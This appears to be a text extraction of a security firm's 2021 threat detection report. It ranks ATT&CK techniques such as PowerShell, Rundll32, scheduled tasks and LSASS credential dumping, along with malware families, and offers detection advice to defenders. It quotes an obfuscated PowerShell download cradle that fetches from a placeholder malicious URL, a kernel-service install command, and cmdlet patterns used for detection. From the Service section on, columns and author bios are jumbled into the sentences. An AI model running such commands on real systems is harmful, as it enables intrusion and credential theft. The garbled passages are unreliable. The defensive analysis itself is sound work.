...
- [Technique T1059: Command and Scripting Interpreter](#technique-t1059-command-and-scripting-interpreter)
  - [T1059.001: PowerShell](#t1059001-powershell)
  - [T1059.003: Windows Command Shell](#t1059003-windows-command-shell)
- [Technique T1218: Signed Binary Process Execution](#technique-t1218-signed-binary-process-execution)
  - [T1218.011: Rundll32](#t1218011-rundll32)
  - [T1218.005: Mshta](#t1218005-mshta)
- [Technique T1543: Create or Modify System Process](#technique-t1543-create-or-modify-system-process)
...
### WHAT’S NEW IN 2021
- **More granular analysis**: MITRE ATT&CK’s adoption of sub-techniques transformed the overall structure of the report as well as the scope of Red Canary’s technique analysis.
- **Intel-fortified context**: Our Intelligence Team compiled the top 10 most prevalent threats we encountered in 2020, putting the top 10 techniques in context with malware and other activity that leverages them.
- **The return of the PDF**: You asked, we listened! By popular demand, this year’s report is available not only in web format, but also in PDF format so you can annotate it to your heart’s content.
...
1. **T1059 Command and Scripting Interpreter** - 24% of total threats
2. **T1218 Signed Binary Process Execution** - 19%
3. **T1543 Create and Modify System Process** - 16%
4. **T1053 Scheduled Task / Job** - 16%
5. **T1003 OS Credential Dumping** - 7%
6. **T1055 Process Injection** - 7%
7. **T1027 Obfuscated Files or Information** - 6%
8. **T1105 Ingress Tool Transfer** - 5%
9. **T1569 System Services** - 4%
10. **T1036 Masquerading** - 4%

---

## TECHNIQUE T1059: Command and Scripting Interpreter (#1 Overall Rank)
...
- **Parent Technique Rank**: #1
- **Organizations Affected**: 48.7% (2,366 confirmed threats)
...
#### Detection
**Collection requirements**: Process and command-line monitoring. Command-line parameters are by far the most efficacious for detecting potentially malicious PowerShell behavior, at least as far as standard process telemetry is concerned. Logs such as Anti-Malware Scan Interface (AMSI), script-block, or Sysmon can be particularly helpful for detecting PowerShell.

**Detection opportunities**:
- **Encoding command switch**: Watch for the execution of `powershell.exe` with command lines that include variations of the `-encodecommand` argument; PowerShell will recognize and accept anything from `-e` onward, and it will show up outside of the encoded bits.
- **Base64 encoding**: Look for the execution of a process that seems to be `powershell.exe` along with a corresponding command line containing the term `base64`. Beyond alerting on PowerShell that leverages Base64 encoding, consider leveraging a tool—like CyberChef, for example—that is capable of decoding encoded commands.
- **Obfuscation**: Once decoded (from Base64), you may encounter compressed code, more Base64 blobs, and decimal, ordinal, and obfuscated commands. You can use regular expressions (such as regex) to increase fidelity and help flag more interesting activity from within the decoded sections. Monitoring for the execution of PowerShell with unusually high counts of characters like `^`, `+`, `$`, and `%` may help you detect suspicious and malicious behavior.
- **Suspicious cmdlets**: Once the command line is decoded to human-readable text, you can also watch for various cmdlets, methods, and switches that may indicate malicious activity. These may include strings such as `Invoke-Expression` (or variants like `iex` and `.invoke`), the `DownloadString` or `DownloadFile` methods, or unusual switches like `-nop` or `-noni`.

**Weeding out false positives**: Monitoring for encoded commands may seem like an easy win, and it is certainly a place to start. However, you will quickly find that many platforms and administrators leverage PowerShell and use encoded commands as a part of normal workflows. Establish baselines and leverage your knowledge of what is normal for your environment to identify what is potentially malicious.

---

### T1059.003: Windows Command Shell
- **Parent Technique Rank**: #1
- **Organizations Affected**: 38.4% (1,984 confirmed threats)
...
One of the most commonly observed techniques is the use of `cmd` to call native commands and redirect the output of those commands to a file on the local admin share. This technique is consistent with Impacket, an open source tool that adversaries use to manipulate networking protocols.
...
#### Emerging Windows Command Shell tradecraft
In the last quarter of 2020, we observed 11 detections for `cmd.exe` replacing `utilman.exe` enabling authentication bypass. Furthermore, adversaries use DOS obfuscation techniques and frameworks like `Invoke-DOSfuscation` to evade simple, signature-based detections. In the Windows Command Shell, the caret (`^`) character is an escape character. When it precedes special characters, like the pipe (`|`) character or file redirection operators, those special characters will be treated as normal characters.

#### Detection
**Collection requirements**: Windows Security Event Logs—specifically Process Creation (ID 4688) events with command-line argument logging enabled—will be the best source of observing and detecting malicious usage of the Windows Command Shell.

**Detection requirements**:
- Focus on uncommon patterns of execution and patterns commonly associated with malice (e.g., high numbers of characters like `^`, `=`, `%`, `!`, `[`, `(`, `;`).
...
**Weeding out false positives**: Understanding your environment and how Windows Command Shell is normally used will help you separate the wheat from the chaff. Create filters to normalize usage and build a successful detection pipeline.

---

## TECHNIQUE T1218: Signed Binary Process Execution (#2 Overall Rank)
...
### T1218.011: Rundll32
- **Parent Technique Rank**: #2
- **Organizations Affected**: 30% (2,380 confirmed threats)
...
From a practical standpoint, Rundll32 enables the execution of native dynamic link libraries (DLL). Executing malicious code as a DLL allows an adversary to keep their malware from appearing directly in a process tree, as a directly executed EXE would.

How do adversaries use Rundll32?  
Adversaries often leverage Rundll32 to load code from DLLs within world-writable directories (e.g., the Windows temp directory), load the legitimate `comsvcs.dll` to call the `MiniDump` function to dump memory from `lsass.exe`, or use `DllRegisterServer` to bypass application controls (seen in droppers for Qbot, Dridex, Egregor, and Maze).
...
#### Detection
**Collection requirements**: Process command-line parameters and process monitoring.

**Detection suggestions**:
- **Execution from world-writable folders**: Watch for `rundll32.exe` writing or loading files to or from locations like `%APPDATA%`, `%PUBLIC%`, `%TEMP%`, etc.
- **Export functionalities**: Monitor for instances of `rundll32.exe` running Windows native DLLs that have export functionalities commonly leveraged by adversaries.
- **Rundll32 without a command line**: Alert on the execution of processes that appear to be `rundll32.exe` without any command-line arguments, especially when they spawn child processes or make network connections.
- **Unusual process lineage**: Monitor for executions of `rundll32.exe` from unusual or untrusted parent processes (e.g., Microsoft Office products, `lsass.exe`, `taskeng.exe`, etc.).

---

### T1218.005: Mshta
- **Parent Technique Rank**: #2
- **Organizations Affected**: 18.8% (738 confirmed threats)
...
- calling the `RunHTMLApplication` export function of `mshtml.dll` with `rundll32.exe`
...
#### Detection
**Collection requirements**: Process and command-line monitoring, process metadata (internal binary names), file monitoring, and network connections.

**Detection suggestions**:
- **Inline script execution and protocol handlers**: Build detection analytics for inline Mshta script execution around protocol handlers (`javascript:`, `vbscript:`, `about:`) appearing in the command line.
- **Suspicious process ancestry**: Alert when unexpected parent processes (like `winword.exe`) spawn `mshta.exe`, or when `mshta.exe` spawns other scripting engines like PowerShell.
- **Mshta masquerading**: Alert on activity where the internal binary name is consistent with `mshta.exe` but the apparent filename is not, or when Mshta executes from locations other than `C:\Windows\System32\`.

---

## TECHNIQUE T1543: Create or Modify System Process (#3 Overall Rank)
...
- **Parent Technique Rank**: #3
- **Organizations Affected**: 4.9% (3,324 confirmed threats)
...
Windows services are imperative to the normal functions of the operating system. They are common binaries that run in the background and are typically not cause for alarm when executed. Since Windows services already exist on the system, an adversary who is able to modify or install a new service is less likely to draw attention to their activities. Furthermore, Windows services typically run automatically during the boot cycle of the operating system with elevated privileges, providing persistence and privilege escalation.

---

on, an adversary must first install a new
...
service VBoxDRV using these commands: T1543.003:
WINDOWS SERVICE
“Adversaries may create or modify
sc create VBoxDRV binpath= “%binpath%\drivers\ Windows services to repeatedly
VboxDrv.sys” type= kernel start= auto error= execute malicious payloads as part of
...
Collection requirements or recovery programs/commands, is
...
l
37 T1543.003: Windows Service

2021 Threat Detection Report
To expand on that last bullet just a bit, one method of assessing executable DETECTION
reputation is to enable the following Microsoft Defender Attack Surface STRATEGISTS
...
l
38 T1543.003: Windows Service

2021 Threat Detection Report
TECHNIQUE T1053
Scheduled Task/Job #4
Scheduled Task/Job ranks fourth this year thanks in large part to detections OVERALL RANK
...
TNELAVERP
l
39 T1053: Scheduled Task/Job

2021 Threat Detection Report
TECHNIQUE T1053.005
Scheduled Task #4
Leveraging the primary task-scheduling component of Windows, this technique PARENT TECHNIQUE RANK
...
one with elevated privileges. As a wide variety of legitimate software uses CONFIRMED THREATS
...
l
42 T1053.005: Scheduled Task

2021 Threat Detection Report
Privilege escalation
In addition to providing adversaries with a means of maintaining access to
environments, scheduled tasks can also run under a specified user context. In T1053.005:
our data, 81 percent of the created tasks were set to run as SYSTEM—the most SCHEDULED TASK
privileged account on Windows. When a scheduled task is created without
specifying a user context, it will run in the context of the user who created the “Adversaries may abuse the Windows
task. This is the second most common configuration we observed. Task Scheduler to perform task
...
Collection requirements directly on the command line, or the
Task Scheduler can be opened through
Windows event logs the GUI within the Administrator
...
l
45 T1053.005: Scheduled Task

2021 Threat Detection Report
more than 100 scheduled tasks by default. As more software packages are DETECTION
installed, they may create additional scheduled tasks for regular updates and STRATEGISTS
...
lego sets.
l
46 T1053.005: Scheduled Task

2021 Threat Detection Report
TECHNIQUE T1003
OS Credential Dumping #5
OS Credential Dumping ranks fifth this year thanks almost entirely to detections OVERALL RANK
...
15.5% 1,447
ORGANIZATIONS AFFECTED CONFIRMED THREATS
The Local Security Authority Subsystem Service (LSASS) is a boon 1,554
...
and Mimikatz. CONFIRMED THREATS
SEE MORE >
...
TNELAVERP
l
47 T1003: OS Credential Dumping

2021 Threat Detection Report
TECHNIQUE T1003.001
LSASS Memory #5
The Local Security Authority Subsystem Service (LSASS) is a boon for PARENT TECHNIQUE RANK
...
movement. The process is a juicy target for adversaries because of the sheer CONFIRMED THREATS
...
dq$(hcaerof;’exe.’+Kjm$+’\’+cilbup:vne$=iB$;’963’ “Adversaries may attempt to access
= Kjm$;)’@’(tilpS.’detcefni=l?php.suoici/lam/ credential material stored in the
niamod.live//:ptth’=tlm$;tneilCbeW.teN tcejbo- process memory of the Local Security
...
l
51 T1003.001: LSASS Memory

2021 Threat Detection Report
Suspicious injection into LSASS DETECTION
STRATEGIST
...
a hypothesis about what constitutes normal and abnormal LSASS memory Justin Schoenfeld
...
As is discussed in the analysis section above, adversaries can create a MiniDump corporation and a startup company. His
file containing credentials by using Rundll32 to execute the MiniDumpW love for endpoint telemetry came from
function in comsvcs.exe and feeding it the LSASS process ID. To detect this his experience as an advanced threat
behavior, you can monitor for the execution of a process that seems to be engineer for a large global hospitality
rundll32.exe along with a command line containing the term minidump. company. Justin is experienced in
...
l
52 T1003.001: LSASS Memory

2021 Threat Detection Report
TECHNIQUE T1055
Process Injection #6
Process Injection enables adversaries to evade defensive controls by executing OVERALL RANK
potentially suspicious processes in the context of seemingly benign ones.
Analysis 31.6%
Why do adversaries use ORGANIZATIONS AFFECTED
Process Injection?
Process Injection is a versatile technique that facilitates a wide range of actions. 1,425
...
With 11 sub-techniques, there’s no shortage of ways that an adversary can based defenses as well as possibly
perform Process Injection. Some standout flavors include: elevate privileges. Process injection is
a method of executing arbitrary code
• remotely injecting DLLs into running processes in the address space of a separate live
• injecting into high-reputation, built-in executables such as notepad.exe to process. Running code in the context
make external network connections and later injecting code that performs of another process may allow access to
malicious actions the process’s memory, system/network
• leveraging Microsoft Office applications to create RemoteThread injections resources, and possibly elevated
into dllhost.exe to conduct attacks with malicious macros in place of privileges. Execution via process
spawning suspicious child processes injection may also evade detection from
• cross-process injection initiated by lsass.exe into taskhost.exe security products since the execution is
• Metasploit injecting itself into processes such as svchost.exe masked under a legitimate process.”
...
l
56 T1055: Process Injection

2021 Threat Detection Report
Further, processes like lsass.exe and svchost.exe are both common targets for DETECTION
Process Injection and common processes in general. As such, baselining normal STRATEGIST
...
l
58 T1027: Obfuscated Files or Information
...
operator
l
59 T1027: Obfuscated Files or Information
...
l
60 T1027: Obfuscated Files or Information
...
l
61 T1027: Obfuscated Files or Information
...
Developing robust coverage for all the possible invocations of Base64 can be otherwise obfuscating its contents on
challenging. In general, it’s better to build detections around behaviors than the system or in transit. This is common
patterns, but there is a place for both. behavior that can be used across
different platforms and the network to
If you’re looking to detect malicious use of Base64 encoding, consider evade defenses.”
...
l
62 T1027: Obfuscated Files or Information

2021 Threat Detection Report
Decoding the obfuscated information to determine its use and analyzing DETECTION
surrounding activities and behaviors will also reduce the false positive rate. Ask STRATEGISTS
yourself:
• What is the parent process? Is it a trusted source or common in Andy
the environment?
Rothman
• What child processes exist? Is the behavior they perform expected
or non-threatening?
DETECTION
• What sibling-processes are present? Are they benign in nature? ENGINEER
TEAM MANAGER
...
l
63 T1027: Obfuscated Files or Information

2021 Threat Detection Report
TECHNIQUE T1105
Ingress Tool Transfer #8
While living off the land is incredibly popular, adversaries still frequently need to OVERALL RANK
...
actions to achieve their objectives. While victim operating systems offer an CONFIRMED THREATS
...
l
65 T1105: Ingress Tool Transfer
...
Data sources that show process execution and command-line arguments (EDR files from an external system into a
tools, Sysmon, Windows Event Logs) are likely your best source of observing compromised environment. Files may
and detecting malicious use of Ingress Tool Transfer. These tools will allow be copied from an external adversary
you to look for a download or transfer taking place, as well as provide leads for controlled system through the
further investigation. Using command-line arguments, you can examine remote command and control channel to bring
systems and content used to facilitate the transfer. For example, PowerShell tools into the victim network or through
and curl command lines often include URLs used to host remote content for alternate protocols with another tool
download and execution. This data point provides an interesting pivot at which such as FTP. Files can also be copied
to proceed during investigations. over on Mac and Linux with native tools
...
l
66 T1105: Ingress Tool Transfer
...
l
67 T1105: Ingress Tool Transfer

2021 Threat Detection Report
Once you understand legitimate use cases, you can tune those out as exceptions DETECTION
and focus your detection efforts on seeking out behaviors that are more likely to STRATEGISTS
...
l
68 T1105: Ingress Tool Transfer

2021 Threat Detection Report
TECHNIQUE T1569
System Services #9
System Services ranks ninth this year thanks almost entirely to detections OVERALL RANK
...
19.2% 892
ORGANIZATIONS AFFECTED CONFIRMED THREATS
Adversaries use the Windows Service Manager to run commands or 909
...
TNELAVERP
l
69 T1569: System Services

2021 Threat Detection Report
TECHNIQUE T1569.002
Service Execution #9
Adversaries use the Windows Service Manager to run commands or install or PARENT TECHNIQUE RANK
...
to as a “service,” and in the Unix/Linux world, such a program is often referred to CONFIRMED THREATS
...
l
70 T1569.002: Service Execution
...
l
71 T1569.002: Service Execution

2021 Threat Detection Report
Unix/Linux systems DETECTION
STRATEGISTS
...
the /etc/rc directory trees. Armstrong
For macOS, pay special attention to the use of launchctl and manipulation of DETECTION
ENGINEER
...
Detection opportunities in computer science and expertise in
...
DETECTION
the Service Control Manager (services.exe), which adversaries use to execute ENGINEER
...
the command specified by string and then terminates. Building detector logic Jim Irwin is a manager on the Detection
accounting for this switch has the potential to cast a wider net for catching Engineering team. Prior to joining
interactive commands without regard for the respective filename of cmd.exe. Red Canary, he served on active duty
and still serves in the Reserves as an
Weeding out false positives
intelligence officer. Jim has worked
both the offensive and defensive side for
False positives most often involve new programs in which the installation the U.S. Army, as a Red Team Lead and
script takes some liberties with how it installs or upgrades software. Games Network Defense Watch Officer.
...
too much noise.
l
72 T1569.002: Service Execution

2021 Threat Detection Report
TECHNIQUE T1036
Masquerading #10
Masquerading ranks tenth this year thanks in large part to detections associated OVERALL RANK
...
23.1% 624
ORGANIZATIONS AFFECTED CONFIRMED THREATS
A behavior that’s inherently suspicious in the context of one 906
...
defenders off. CONFIRMED THREATS
SEE MORE >
T1036: MASQUERADING
...
TNELAVERP
l
73 T1036: Masquerading

2021 Threat Detection Report
TECHNIQUE T1036.003
Rename System Utilities #10
A behavior that’s inherently suspicious in the context of one process can be PARENT TECHNIQUE RANK
...
detection logic dependent on process names and process paths. Renaming CONFIRMED THREATS
...
l
74 T1036.003: Rename System Utilities
...
member -list | csrss.exe -h breached.contoso[.] rename rundll32.exe). An alternative
com -f objectcategory=* > .\Mod\mod1.log case occurs when a legitimate utility is
...
-passegregor[####]
l
75 T1036.003: Rename System Utilities
...
l
76 T1036.003: Rename System Utilities

2021 Threat Detection Report
a different process name. Since adversaries typically copy binaries that are DETECTION
already on disk, a renamed system utility should have the same hash as the STRATEGIST
...
Weeding out false positives
Brian Donohue
Looking for process names (e.g., rundll32.exe) outside of expected paths will SR. INFORMATION
generate false positives because many software developers bundle specific SECURITY SPECIALIST
versions of a system process. For example, we often run into false positives on
rundll32’s unexpected paths for certain antivirus software. Identify any tools Brian has been writing about and
that exhibit this behavior and add them as exclusions to your toolset. researching information security for
...
l
77 T1036.003: Rename System Utilities
...
THREAT
TA551 #1
TA551, also known as Shathak, is a threat group that uses large-scale phishing OVERALL RANK
...
2021 Threat Detection Report
For those of you detecting at home, note that none of this would have been DETECTION
possible if our detection coverage relied solely on the filename of mshta.exe to STRATEGIST
be accurate.
Jeff Felling
...
THREAT
Cobalt Strike #2
Cobalt Strike is a post-exploitation tool used by many adversaries and OVERALL RANK
...
2021 Threat Detection Report
binaries that mirror the functions of PsExec. In addition, adversaries may pivot EXAMPLE
...
2021 Threat Detection Report
• svchost.exe DETECTION
• msiexec.exe STRATEGIST
Tony Lambert
INTELLIGENCE
ANALYST
...
THREAT
Qbot #3
Qbot is a banking trojan with the ability to quickly spread to other hosts within OVERALL RANK
...
2021 Threat Detection Report
user’s profile folder, so looking for that execution presents another detection DETECTION
...
detection analytic looking for schtasks.exe along with create and a regular Kyle Rainey
...
THREAT
IcedID #4
IcedID, also known as Bokbot, is a banking trojan often delivered through OVERALL RANK
...
2021 Threat Detection Report
sysinfo command executes several specific commands that are highly unusual DETECTION
to see coming from msiexec.exe. Each of the commands below are unusual to STRATEGIST
...
conundrums confounding corporate
computer custodians, aka a threat
In other cases, the abnormality is a bit more nuanced, and we have to consider hunter. After nearly a dozen years
the command-line behavior of the child process. For instance, it is uncommon to analyzing anomalies, foraging for
see msiexec.exe execute wmic.exe to query the installed antivirus (AV) software, forensic artifacts, and mulling over
as seen in the below screenshot. This is a parent-child process relationship that, malware for the DoD, Jeff returned
when combined with the command line, provides a detection opportunity. home to Indiana in 2016 where he
helped create Anthem, Inc.’s threat
hunting program, ORION, prior to
joining Red Canary in April 2019. Jeff
holds degrees in mathematics from
...
THREAT
Mimikatz #5
Mimikatz is a credential-dumping utility commonly leveraged by adversaries, OVERALL RANK
...
2021 Threat Detection Report
ATT&CK tactic(s): Credential Access DETECTION
STRATEGIST
...
INTELLIGENCE
Library (vaultcli.dll). With this information you can identify instances of ANALYST
...
THREAT
Shlayer #6
Shlayer, a trojan known for delivering malicious adware, is the only macOS- OVERALL RANK
...
malware with a legal department.” dangerous on the Mac than
“real” malware. They can intercept
We weren’t surprised to see Shlayer make it into our top 10 for 2020, as the most and decrypt all network traffic,
...
adware threats such as modifying SSH Authorized Keys and using SCP to deep into the system so that
circumvent controls on macOS. By working to detect behaviors like these, we’ve it is incredibly challenging to
found success in detecting a range of macOS threats. eradicate completely.”
Thomas Reed
Detection opportunities MALWAREBYTES
Detection opportunity 1
...
2021 Threat Detection Report
Detection opportunity 2 DETECTION
STRATEGIST
...
a password-protected archive from /tmp into a folder under /tmp as suspicious Tony Lambert
...
skills to research malware, detect
malicious activity, and recommend
Detection opportunity 3 remediation paths. Tony is a natural
teacher and regularly shares his
findings and expertise through blogs,
...
THREAT
Dridex #7
Dridex is a banking trojan commonly distributed through emails containing OVERALL RANK
...
2021 Threat Detection Report
hijacking. This type of attack is successful when a Windows native binary DETECTION
executes from within a directory that contains one or more malicious DLL STRATEGIST
...
THREAT
Emotet #8
Emotet is a trojan known for delivering follow-on payloads, including TrickBot, OVERALL RANK
...
2021 Threat Detection Report
1. Many security products are unable to reconstruct the broken process chain DETECTION
caused by proxying execution through COM, so it can be difficult to enrich STRATEGIST
...
THREAT
TrickBot #9
TrickBot is a modular banking trojan that has led to ransomware such as Ryuk OVERALL RANK
...
we observed it regularly creating scheduled tasks that contain the folder of Katie Nickels
Appdata\Roaming. A useful analytic we created to detect TrickBot and other
threats is looking for a parent process of taskeng.exe or svchost.exe executing DIRECTOR OF
INTELLIGENCE
...
Detection opportunity 3 Threat Intelligence Lead at The MITRE
...
THREAT
Gamarue #10
Gamarue is a worm that primarily spreads via USB drives. Despite its command OVERALL RANK
...
2021 Threat Detection Report
using the ROT13 cipher. Because Gamarue is often installed by a user clicking DETECTION
an LNK file, if you’re trying to figure out the source of Gamarue, check out the STRATEGIST
...
ON OUR RADAR
Other threats #10
This section considers threats that weren’t widespread enough to make our top OVERALL RANK
